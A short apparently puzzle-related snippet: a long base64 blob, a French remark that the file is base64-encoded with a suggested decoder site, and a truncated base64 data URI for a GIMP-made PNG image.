iVWxKU1k0NjZxaDg5YXRmM1N5VzdmWFhYOCtiYjc2WnZuMzdwbEdqUmpuNzdMTlRWbGFXVjE1NXBkSzBiZHUyVGZQbXpmUExYLzR5aXhjdnJuSis1ZVhsR1Rac1dKTGs4TU1QWDJNZFhuVFJSVW1TSVVPR3BGbXpabFUrZnV1dHQ4N1paNStkNDQ0N0xvODk5bGlWVWJTaGR0MTExOXg4ODgxSmtrR0RCdFhxZzNCajJIUFBQWk1rOTkxM1g2V3pXTVZ4WHZ2dHQxL2F0R21UeVpNbjU2T1BQbHBqbWc4KytDQmxaV1hwM3IxN3Z2S1ZyM3lwanMxbXpacmxoQk5PU0pKMWp2RmNQYUtLKytZbm4zeFM2VmovdlB2cHdvVUxNMkRBZ0lyM2kzVzlGK3l3d3c0NThjUVQxMnU1YTFxR0RUbTIxOWFpUll0Y2NjVVZ1ZUdHR3lyTnY3eThQTmRjYzAyR0RoMmFyMy85Nnh0MVh0VnAxYXBWYnJqaGhvd1pNeVpUcDA2dDlmdjZGNzJkQkNCczVtYk1tSkVsUzVha1I0OGVhZFdxMVJhMWJPUEhqMCtTbEphV0prbkZYN2kvLy8zdkswM2JwRW1UREJ3NE1FdVdMTW0wYWRPcW5OOHJyN3lTc3JLeURCMDZkSTBQeituVHAyZkpraVhwM3IxNzl0OS8veHBmVTZOR2pkSzNiOThreWZQUFAxK255OXVtVFp1MGJkczJaV1ZsbVR0MzdpYXhEWm8yYlpxZVBYdW1yS3dzSDN6d1FhVVA4ZWJObTJlWFhYYkp2dnZ1bXlTVnpuUVZMeDEzNnRUcFMzMmMxdmFzKy9MbHl5c2lZZTBQL2JyWVQ0dno2Tm16Wi9iYmI3OHZaRmxyV29ZTk9iYXIwcVZMbDh5ZE83ZGkyTXJxeC9pQ0JRdlN1WFBuV3IvZXVweFhkYnAzNzU0a3VmYmFhMnQxNVdCamJDY0JDSnU1NGlXV2poMDdiamFYZG10ai92ejV1ZmJhYTNQV1dXZGx0OTEyUzVMc3ROTk82ZCsvZjRZUEg1NnlzckpLai9udWQ3K2JKTlYrRzdoNGFmVjczL3ZlR3Y5ZWpKYWpqejY2VnV1dytJYjg2S09QMXVreTE2dFhMMTI3ZGsyU3pKczNiNVBaRnNjY2M4d2FNWmY4NXh1YzQ4YU5TKy9ldmRPd1ljUHNzc3N1YWRteVpkNTQ0NDAxSGx1TThjMWgvRjlkVzdod1ljYU5HNWNrNnp5RHRIejU4c3liTnk4MzNuaGpwa3laa3E1ZHUxYjZnNjR1OXRQaVBMN3puZTk4SWVHM3JtWFkwR043YmExYnQwN3IxcTN6aHovOG9kSXgzclp0Mi9YYTMrcHlYdFhaY2NjZGMvZmRkMmZDaEFtWk5HblNPcWYvSXJlVEFJUXQ2RU9tcHIrMHYwZ0hISEJBbGJmSytQV3ZmLzI1NS8zQ0N5OGsrZS9ZdnFKdTNib2xTYVpNbVZMcE1hMWF0VXJuenAxei8vMzM1LzMzMzEvamQvUG16Y3V0dDk2YTB0TFNTbS9veFhWWTArWHoxVzIvL2ZaSmtwZGVlbW05eHZUVVJvc1dMWklrSDMvODhTYXpqUTQ4OE1Bay8vMHlSL0tmOFgrVEprMnF1TlJYdjM3OS9PaEhQOG9qanp5U1FxR1FKRm14WWtWR2pScVY1TCtYa3Rmbk5SWi9ycnp5eXYvNVBsMjh2VXR0TEZ1MkxPKzk5MTZ1dlBMS2xKV1ZwVk9uVGxXT2Yxejl1Um8wYUpDV0xWdG0wS0JCNmQrL2YrNjg4ODdVcjErL3p2ZlQ0cTJncXJ0OC9Qenp6MWU1N0gvNzI5L1d1YjVxc3d3YmVteXZyVUdEQmpuLy9QTnozWFhYWmY3OCtXc2M0LzM2OWF2eWVUZkd2R3JTclZ1M3RHelpNa09HRE1uLy9kLy8xVGh0WFc4bkFRaGJzQzNwN04rcVZhdHk3NzMzSmtrT08reXdOWDdYcGsyYk5HL2VQSGZjY1VkV3JGaXh4dStLWTUrUzVMbm5ucXYwaHBra1AvM3BUN1BOTnR0c3N1dXdHRStiMHZZc3h0dTk5OTViTVE2d2VJWmk5VE04YmR1MlhXTWM0QWNmZkpDNWMrZW1SNDhlYWRxMDZSWjkvSzBlUWcwYk5zemVlKytkVzIrOU5mdnV1Mjl1dXVtbU5HalFvTlpubzg0KysreUtQd1RxZWovZEdQdFhUY3V3b2NkMlZZcG54MTU4OGNVa3FianMzS0ZEaC9WK3pYVTVyK28wYTlZc3c0WU55MHN2dlpRSkV5WnNkdThEQWhBMk1jVy9FUC8xcjM5dDlPZXU3cFlaeGJGSEcycm16Smw1N0xISGN2WFZWMWNLaCsyMjJ5NlhYSEpKcGt5WlV1VXRYNHBqaW9ZUEgxNFJLeXRYcnF5NDZYTlZiK2pydXc2TForZmF0V3VYZXZYcTFlazZMWDVab0VtVEpwdk1ObXJhdEdsNjllcTF4ampBTjk5OE0wMmFOS200aEpmODk1SmpNUTZMdDlZb1hwcGYzOWRZL05tWVp3QnJlaTFyWDk2dUtRWjc5KzZkVWFOR1pjcVVLZFdPMTF2OXVjckx5L1BjYzgrbHZMdzhwYVdsVlg1N3RpNzIwK0k4cXJzOXl4RkhITEhHTXA5ODhzbTFYbCsxV1liUGMyeFg5WWRKOSs3ZGMvLzk5MmY1OHVVWk1XSkVldmJzbWQxMzMzMkQvc2lwcTNuVnBFdVhMam4wMEVOejZhV1hWdnRsdFM5aU93bEEyQUlWNzBzMmVmTGtpcjhhTjNkUFB2bGtrdVRTU3krdDhqTEhCUmRja0NSNS9QSEhLejIyUllzV0dUaHdZS1pObTVhMzNucXI0a05xMHFSSjZkZXZYMXEyYkZucE1jWDdBVDc5OU5PMVdvZkZzWERGVzBqVWxaVXJWMVlNanEvcWRmNHZyVDRPc0ZBb1pQejQ4ZW5UcDA4YU5XcFVNYzJ1dSs2YUprMmFWTndQc0hqSnVIZ0plVXUyZWdpOTg4NDdHVEZpUk00NDQ0dzBiOTY4Vm85djNMaHhPblRva0pFalIyYkpraVc1L1BMTEt3MHZxSXY5dERpUFo1OTl0czdYUVcyVzRmTWMyMnNyS1NuSjZhZWZudkhqeDJmMDZORjU0b2tuMHIxNzl3MDZhMWFYODZwSmt5Wk5jdFZWVjJYV3JGa1Y0ME9yOGtWdUp3RUlXNGo5OTk4L1RabzB5YWhSb3pKejVzek5mbm1XTEZtU2E2Kzl0bGJUWG5iWlpSVmpaVlpYL0NKRjhUSkw4VVBucEpOT3F2YU1UWk1tVFRKbXpKaDEvdGRoUzVjdXJUaWJlTVFSUjlUcHNyLzY2cXVaTm0xYVdyWnNtVDMyMkdPVDJpNnJqd09jUDM5K0prNmNXT20rWXcwYk5zeFBmdktUUFBMSUkxbTJiRmxHamh4WmNYYUYybW5mdm4zNjlldVhCeDk4c09KeVpGM3VwOFY1M0gvLy9SdDBNL1BQc3d4MWNXeXZyVjI3ZGttUzNyMTdKL25QTUlRTlZaZnpxc214eHg2YjQ0NDdMdjM3OTYvMjlrQWJZenNKUU5qTU5XdldyT0lPOEpkZWVtbU5sNGNLaFVLZWVlYVovUHZmLzk1a2wyZmF0R2xac0dCQnJyLysraG92Qzk1enp6MUovalBBZlcySEhISklXcmR1bmNHREIyZnUzTGtaTW1SSVdyWnNtVFp0MmxTN0RvdjNCN3o4OHN1cnZleXlhdFdxakJneElrODg4VVE2ZCs2OHhyMEVQNit5c3JLSyszNWRjODAxMlc2NzdUYXA3Ykw2T01EaTVibXF2dUhacmwyN1RKNDhPUys4OEVMbXpwMmJYcjE2WlljZGRuQ2cxdlpEYTZ1dEtzYXhybjNqNExyWVQ1czFhNVliYjd3eFNUSjQ4T0FhLzZlT3VsNkd1amkycXpwMmkwTUVoZzRkK3JudU5WbVg4NnBKdzRZTk0yalFvQ3hac2lTLy9lMXZxMzB0WC9SMkVvQ3dCZWpldlh2T091dXNqQjA3TnQyNmRjdWYvdlNueko4L1B5dFdyTWlxVmF1eWVQSGkvT1V2ZjhtRkYxNllvNDgrZXBPK1ZGeDhRMXo3djUxYjI1RkhIcGtrR1RseVpLWGxhZGl3WWZyMzc1OGsrZm5QZjU0bFM1Wms0TUNCTlVaVmp4NDljdXFwcCtiaGh4L09HV2Vja1NsVHBtVHg0c1g1N0xQUHNuVHAwc3ljT1RPREJ3L09lZWVkbCtiTm02L1h3UDdxUHFUTHk4c3paODZjL09ZM3Ywbjc5dTN6d2dzdnBHL2Z2cHZrRFYxMzJHR0g5TzdkTzJWbFpSVWZURldOanlwRzRmWFhYMStyN1VobDMvakdOOUtuVDUrTUhUdDJqVzllMTlWK2V2cnBwK2Vzczg3SzczNzN1NXh3d2dsNS9QSEg4K0dISDJiWnNtVXBGQW9WdDNNWk4yNWN4YmpIOWIwVVd0VXkxTVd4WFpVcnJyZ2loVUlobDE1NjZlZGU5M1U1cjVvY2NjUVJPZm5razlPL2YvOXFML051ak8yMEphdG5GZkJsMEtoUm85eDg4ODNaYmJmZGN2bmxsMWQ3NDlJOTk5d3pFeWRPM0dUL0o1RDMzMzgvZDkxMVYwcExTM1BBQVFmVU9PMWVlKzJWcmwyNzVzRUhIOHlRSVVNcS9SK3RIVHQyVEpLTUhUczJ5WC9Ic0ZWbjIyMjN6UjEzM0pHZGQ5NDVOOXh3UTdYZjB1dllzV051di8zMkRibzU2N3FXYWZqdzRlblZxOWNhNCtyV2R4NExGeTc4d3M1Y0hIWFVVYm4zM25zelljS0U5T3ZYTDQwYk42NDBUZkZMSWNYMTk3OGUvN2UrNjJ0ZDAwK2NPUEVMajlxdHR0b3E1NXh6VHU2KysrN2NkdHR0T2Z6d3c3UDExbHZYMlg3YXFGR2ovT3BYdjhwZWUrMVY4YVdMNmh4NjZLR1pOR25TZW85SlhYc1pXclJvVVdmSDlwWmdtMjIyeVlVWFhwaUhIbnFvMmpPZEcyTTdDVURZQW15MzNYWVpQSGh3VGpubGxFeWRPalZUcDA3TlcyKzlsVldyVnFWOSsvWTU2cWlqMHJGangwMzZkaHpGTjdpK2ZmdFdlNnVXMVQ5Z2V2YnNtZkhqeCtlWlo1NnA5Q0d4NTU1N3BtZlBubm5nZ1FmU3RXdlhpditwb2laTm16Yk5zR0hEY3NZWlorVDU1NS9QbENsVDh2cnJyMmVQUGZiSXQ3NzFyUng1NUpFcExTMnRNZEJxcTdTME5IdnNzVWRhdDI2ZGd3NDZxT0lXR0p1eTFlK2ZXTjM0eDIyMzNUYjkrL2ZQTGJmY2tpU2IzRmpHemNVM3Yvbk45T2pSSTZOR2pjb0ZGMXl3eG5pMHV0aFBHemR1bkVHREJ1V0hQL3hoWG56eHhVeWRPalZ2di8xMjVzK2ZuNE1QUGppSEgzNTREanZzc0xSdDJ6YmJicnZ0NTE2RzRzM1o2K0xZM2xLMGJkczJmZnIweWQxMzMvMC8zVTVicXBMQ2x2SzFTQUFBYXNVWVFBQUFBUWdBZ0FBRUFHQ0w0VXNnOEQrMlBzTnczY0lBQUFFSW03a1ZLMWFrZnYzNnRaNSsrZkxsNi95R0lBQ3NpMjhCQXdCOHlSZ0RDQUFnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBQUFJUUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBQUFJUUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQkNBQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUlBQUJBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQWhBQUFBRUlBQUFBaEFBQUFFSUFJQUFCQUJBQUFJQUNFQ3JBQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBQUFJUUFBQUJDQUNBQUFRQVFBQUNBQ0FBQVFBUWdBQUFDRUFBQUFRZ0FJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBQUFJUUFBQUJDQUNBQUFRQVFBQUNBQ0FBQVFBUWdBQUFDRUFBQUFRZ0FJQUFCQUJBQUFJQUlBQUJBQkNBQUFBSVFBQUFCQ0FBQUFJUUFBQUJDQURBRitiL0FWL28xZ2ZKSlFDT0FBQUFBRWxGVGtTdVFtQ0M=

Le contenu du fichier est encodé en base64. Décodons en utilisant le site https://www.base64decode.org/:

data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAHgCAYAAAA10dzkAAABhWlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mSkUrDnYQcchQdbEgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfExdVJ0UVK/C4ptIjx4O4e3vvel7vvAKFeZprVMQ5oum2mEnExk10VQ6/oQRgRWkdlZhlzkpSE7/i6R4DvdzGe5V/35+hVcxYDAiLxLDNMm3iDeHrTNjjvE0dYUVaJz4nHTLog8SPXFY/fOBdcFnhmxEyn5okjxGKhjZU2ZkVTI54ijqqaTvlCxmOV8xZnrVxlzXvyF4Zz+soy12kOIYFFLEGCCAVVlFCGjRjtOikWUnQe9/EPun6JXAq5SmDkWEAFGmTXD/4Hv3tr5ScnvKRwHOh8cZyPYSC0CzRqjvN97DiNEyD4DFzpLX+lDsx8kl5radEjoG8buLhuacoecLkDDDwZsim7UpCmkM8D72f0TVmg/xboXvP61jzH6QOQpl4lb4CDQ2CkQNnrPu/uau/bvzXN/v0AUAdymVJBvRkAAAAGYktHRAD/AP8A/6C9p5MAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfjCwwUDRI8OkmMAAAAGXRFWHRDb21tZW50AENyZWF0ZWQgd2l0aCBHSU1QV4EOFwAAGhVJREFUeNrt3XmUlXXhx/HPKLKIKFGBR3HfcAlNJKERwy0OkQdDTUURQjEyRMM8gooLYXrELUXNBRcIjmUKZEqKIoqiSe4KCEhmgwkVcGR+Ipv390fnTsAsDDgS4Ot1zvzDPPe599nufc/zfO9DSaFQKAQAgC+NrawCAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgJBZs2Zl5MiR+fGPf5wjjjgi7du3z/nnn59x48Zl0aJFSZJly5alpKRkvX+eeuqpJEn//v3XOe3rr79eJ8tTKBTSq1evlJSUpFu3bvnss88qTTNy5MiUlJRkzJgxtZrnI488kpKSktx1111VPt8bb7yR2267LaeddloOPPDAfP/7388VV1yRp556KkuXLq12vsX1MmPGjCr/vfiz/fbb58gjj0yPHj1y/fXXZ8KECVmwYEGNr7m6ea9r+vXZRms/x6JFi1JSUpJddtkly5cvr/J5nn322Yr5ffjhh1VOM3v27JSUlOSUU07ZoGW66qqrUlJSkldffXW913ldrq+SkpLMnj17nY87+OCDc84552T06NH55z//WavnOvDAA9OjR4/ceeedee+992p1XGzofrq6uXPnZvTo0TnvvPNyzDHH5OCDD86ZZ56Ze+65J2+//XaVx1tdLsO6ju3qnnPs2LE1TvvQQw9VTHvhhRdulHnVdNy/88471c5/4MCBVe5bdbGdvtQK8CWxZMmSwi9+8YtCkmp/WrZsWZg4cWJh6dKlNU5X3c/EiRMLhUKhcN55561z2tdee61OlmvOnDlrzHfGjBmVpvnrX/9aSFIoLS0tLF++vMb5rVy5stClS5dCksKsWbPW+N3ixYsLF110UY3L1bFjxypfw+rrZfr06VX++7p+hg8fXigvL1+veVdnQ7ZRVc/Ro0ePQpLC7Nmzq3yem2++uWJ+zz77bJXTPProo4Ukhfvuu2+DlunKK68sJCm88sor673O63J9VbXPrOtxBxxwQKX9pTbP9eSTT1b7Wj/vflooFArl5eWFa665Zp2vo2/fvoW///3vG7S+alqG2h7b1T3n8ccfX1i5cmWV061YsaLQqVOnimkHDBiwUeZV03F/7rnnFlatWlXlc1x88cVV7lt1sZ2+zJwB5Eth6dKlueCCCzJ48OCUlpbm8ccfzz/+8Y8sW7YsK1asyKJFi/Lyyy/npJNOynHHHZfy8vIUCoVKP6+99lqS5OKLL67y98cee+wazzt9+vQqpysUCjnkkEPqZNkmT56cJBk+fHiS5Omnn640ze67754+ffrkhRdeyNtvv13j/N5999089thjOfXUU7P33ntX/Psnn3ySc889N8OGDUunTp3y3HPPZdGiRVm5cmU++eSTzJgxIwMHDszkyZPzne98J7NmzVrvZVl9fa1YsSIff/xxZs2alQceeCDNmzdPv379ctFFF9X67M36PueGbKPiNn/33Xcr/e6zzz7Lww8/nAEDBmTfffet9qzvyy+/nCQ56KCDNvljqab1VSgUss8++6zzcZ9++mnmzJmTfv36Zfr06RkwYECVZ1BXf8yyZcsyb968XHfddUmSM844IwsXLqz0mLrYT5cuXZrzzz8/gwYNSmlpaf74xz+mrKwsn376aVatWpXy8vLMnj07Y8aMyXPPPZebbrqpVuurtsuwPsd2VS655JI8+uij1R6DM2fOzBNPPJHLLrtso86rOu3atcvtt99e5Rnsdb2v19V2cgkYtlBjxozJiBEj8oMf/CDjxo1L586ds+OOO6Z+/fqpV69emjZtmrZt2+bGG2/MpEmTUlJSslks16effppbbrklHTp0SO/evdOpU6dce+21KS8vrzTtqaeemiR54oknapxn8TL2mWeeucZ6GDVqVMaMGZMTTzwxY8aMSYcOHdK0adNsvfXWadSoUVq1apWhQ4fmlltuyYIFCzJgwIAsW7Zsg5etXr16adKkSfbZZ5+ceeaZmTZtWtq1a5c77rgjDz/88CazDYrR9uc//7nS7z766KNMmTIlRx11VHr06JGxY8dWuhS1fPny3HfffUmSvfba60txPDZo0CB77bVXrrrqqrRs2TITJkzInDlzanxM/fr1s9NOO+X8889Px44ds2DBgiovCdbFfjp69OiMGDEiJ554YsaPH58uXbpk5513ToMGDbLVVlulcePG2XvvvXPaaadl6tSp+fa3v12r5a7tMqzvsb22448/PknyzDPP1HiMd+nSZaPOqzqXX355kuSmm27KypUra/24L2o7CUDYQixcuDA/+9nPkiRXX311vva1r1U7bUlJSY466qh89atf3SyW7fXXX8+bb76Zvn37plGjRjn77LNTVlaWV155pdK0bdu2TfPmzfPLX/4yixcvrnJ+5eXlGTZsWJLk8MMPX2MdXnTRRUmSIUOGpFmzZlU+fuutt87ZZ5+d4447Lo899liVUbShdt1119x8881JkkGDBtXqg3Bj2HPPPZMk9913X6WzWMVxXvvtt1/atGmTyZMn56OPPlpjmg8++CBlZWXp3r17vvKVr3ypjs1mzZrlhBNOSJJ1jvFcPaKK++Ynn3xS6Vj/vPvpwoULM2DAgIr3i3W9F+ywww458cQT12u5a1qGDTm219aiRYtcccUVueGGGyrNv7y8PNdcc02GDh2ar3/96xt1XtVp1apVbrjhhowZMyZTp06t9fv6F72dBCBs5mbMmJElS5akR48eadWq1Ra1bOPHj0+SlJaWJknFX7i///3vK03bpEmTDBw4MEuWLMm0adOqnN8rr7ySsrKyDB06dI0Pz+nTp2fJkiXp3r179t9//xpfU6NGjdK3b98kyfPPP1+ny9umTZu0bds2ZWVlmTt37iaxDZo2bZqePXumrKwsH3zwQaUP8ebNm2eXXXbJvvvumySVznQVLx136tTpS32c1vas+/LlyysiYe0P/brYT4vz6NmzZ/bbb78vZFlrWoYNObar0qVLl8ydO7di2Mrqx/iCBQvSuXPnWr/eupxXdbp3754kufbaa2t15WBjbCcBCJu54iWWjh07bjaXdmtj/vz5ufbaa3PWWWdlt912S5LstNNO6d+/f4YPH56ysrJKj/nud7+bJNV+G7h4afV73/veGv9ejJajjz66Vuuw+Ib86KOP1uky16tXL127dk2SzJs3b5PZFsccc8waMZf85xuc48aNS+/evdOwYcPssssuadmyZd544401HluM8c1h/F9dW7hwYcaNG5ck6zyDtHz58sybNy833nhjpkyZkq5du1b6g64u9tPiPL7zne98IeG3rmXY0GN7ba1bt07r1q3zhz/8odIx3rZt2/Xa3+pyXtXZcccdc/fdd2fChAmZNGnSOqf/IreTAIQt6EOmpr+0v0gHHHBAlbfK+PWvf/255/3CCy8k+e/YvqJu3bolSaZMmVLpMa1atUrnzp1z//335/3331/jd/Pmzcutt96a0tLSSm/oxXVY0+Xz1W2//fZJkpdeemm9xvTURosWLZIkH3/88SazjQ488MAk//0yR/Kf8X+TJk2quNRXv379/OhHP8ojjzySQqGQJFmxYkVGjRqV5L+XktfnNRZ/rrzyyv/5Pl28vUttLFu2LO+9916uvPLKlJWVpVOnTlWOf1z9uRo0aJCWLVtm0KBB6d+/f+68887Ur1+/zvfT4q2gqrt8/Pzzz1e57H/729/Wub5qswwbemyvrUGDBjn//PNz3XXXZf78+Wsc4/369avyeTfGvGrSrVu3tGzZMkOGDMn//d//1ThtXW8nAQhbsC3p7N+qVaty7733JkkOO+ywNX7Xpk2bNG/ePHfccUdWrFixxu+KY5+S5Lnnnqv0hpkkP/3pT7PNNttssuuwGE+b0vYsxtu9995bMQ6weIZi9TM8bdu2XWMc4AcffJC5c+emR48eadq06RZ9/K0eQg0bNszee++dW2+9Nfvuu29uuummNGjQoNZno84+++yKPwTqej/dGPtXTcuwocd2VYpnx1588cUkqbjs3KFDh/V+zXU5r+o0a9Ysw4YNy0svvZQJEyZsdu8DAhA2McW/EP/1r39t9Oeu7pYZxbFHG2rmzJl57LHHcvXVV1cKh+222y6XXHJJpkyZUuUtX4pjioYPH14RKytXrqy46XNVb+jruw6LZ+fatWuXevXq1ek6LX5ZoEmTJpvMNmratGl69eq1xjjAN998M02aNKm4hJf895JjMQ6Lt9YoXppf39dY/NmYZwBrei1rX96uKQZ79+6dUaNGZcqUKdWO11v9ucrLy/Pcc8+lvLw8paWlVX57ti720+I8qrs9yxFHHLHGMp988sm1Xl+1WYbPc2xX9YdJ9+7dc//992f58uUZMWJEevbsmd13332D/sipq3nVpEuXLjn00ENz6aWXVvtltS9iOwlA2AIV70s2efLkir8aN3dPPvlkkuTSSy+t8jLHBRdckCR5/PHHKz22RYsWGThwYKZNm5a33nqr4kNq0qRJ6devX1q2bFnpMcX7AT799NO1WofFsXDFW0jUlZUrV1YMjq/qdf4vrT4OsFAoZPz48enTp08aNWpUMc2uu+6aJk2aVNwPsHjJuHgJeUu2egi98847GTFiRM4444w0b968Vo9v3LhxOnTokJEjR2bJkiW5/PLLKw0vqIv9tDiPZ599ts7XQW2W4fMc22srKSnJ6aefnvHjx2f06NF54okn0r179w06a1aX86pJkyZNctVVV2XWrFkV40Or8kVuJwEIW4j9998/TZo0yahRozJz5szNfnmWLFmSa6+9tlbTXnbZZRVjZVZX/CJF8TJL8UPnpJNOqvaMTZMmTTJmzJh1/tdhS5curTibeMQRR9Tpsr/66quZNm1aWrZsmT322GOT2i6rjwOcP39+Jk6cWOm+Yw0bNsxPfvKTPPLII1m2bFlGjhxZcXaF2mnfvn369euXBx98sOJyZF3up8V53H///Rt0M/PPswx1cWyvrV27dkmS3r17J/nPMIQNVZfzqsmxxx6b4447Lv3796/29kAbYzsJQNjMNWvWrOIO8JdeemmNl4cKhUKeeeaZ/Pvf/95kl2fatGlZsGBBrr/++hovC95zzz1J/jPAfW2HHHJIWrduncGDB2fu3LkZMmRIWrZsmTZt2lS7Dov3B7z88surveyyatWqjBgxIk888UQ6d+68xr0EP6+ysrKK+35dc8012W677Tap7bL6OMDi5bmqvuHZrl27TJ48OS+88ELmzp2bXr16ZYcddnCg1vZDa6utKsaxrn3j4LrYT5s1a5Ybb7wxSTJ48OAa/6eOul6Guji2qzp2i0MEhg4d+rnuNVmX86pJw4YNM2jQoCxZsiS//e1vq30tX/R2EoCwBejevXvOOuusjB07Nt26dcuf/vSnzJ8/PytWrMiqVauyePHi/OUvf8mFF16Yo48+epO+VFx8Q1z7v51b25FHHpkkGTlyZKXladiwYfr3758k+fnPf54lS5Zk4MCBNUZVjx49cuqpp+bhhx/OGWeckSlTpmTx4sX57LPPsnTp0sycOTODBw/Oeeedl+bNm6/XwP7qPqTLy8szZ86c/OY3v0n79u3zwgsvpG/fvpvkDV132GGH9O7dO2VlZRUfTFWNjypG4fXXX1+r7Uhl3/jGN9KnT5+MHTt2jW9e19V+evrpp+ess87K7373u5xwwgl5/PHH8+GHH2bZsmUpFAoVt3MZN25cxbjH9b0UWtUy1MWxXZUrrrgihUIhl1566ede93U5r5occcQROfnkk9O/f/9qL/NujO20JatnFfBl0KhRo9x8883Zbbfdcvnll1d749I999wzEydO3GT/J5D3338/d911V0pLS3PAAQfUOO1ee+2Vrl275sEHH8yQIUMq/R+tHTt2TJKMHTs2yX/HsFVn2223zR133JGdd945N9xwQ7Xf0uvYsWNuv/32Dbo567qWafjw4enVq9ca4+rWdx4LFy78ws5cHHXUUbn33nszYcKE9OvXL40bN640TfFLIcX1978e/7e+62td00+cOPELj9qtttoq55xzTu6+++7cdtttOfzww7P11lvX2X7aqFGj/OpXv8pee+1V8aWL6hx66KGZNGnSeo9JXXsZWrRoUWfH9pZgm222yYUXXpiHHnqo2jOdG2M7CUDYAmy33XYZPHhwTjnllEydOjVTp07NW2+9lVWrVqV9+/Y56qij0rFjx036dhzFN7i+fftWe6uW1T9gevbsmfHjx+eZZ56p9CGx5557pmfPnnnggQfStWvXiv+poiZNmzbNsGHDcsYZZ+T555/PlClT8vrrr2ePPfbIt771rRx55JEpLS2tMdBqq7S0NHvssUdat26dgw46qOIWGJuy1e+fWN34x2233Tb9+/fPLbfckiSb3FjGzcU3v/nN9OjRI6NGjcoFF1ywxni0uthPGzdunEGDBuWHP/xhXnzxxUydOjVvv/125s+fn4MPPjiHH354DjvssLRt2zbbbrvt516G4s3Z6+LY3lK0bds2ffr0yd133/0/3U5bqpLClvK1SAAAasUYQAAAAQgAgAAEAGCL4Usg8D+2PsNw3cIAAAEIm7kVK1akfv36tZ5++fLl6/yGIACsi28BAwB8yRgDCAAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAA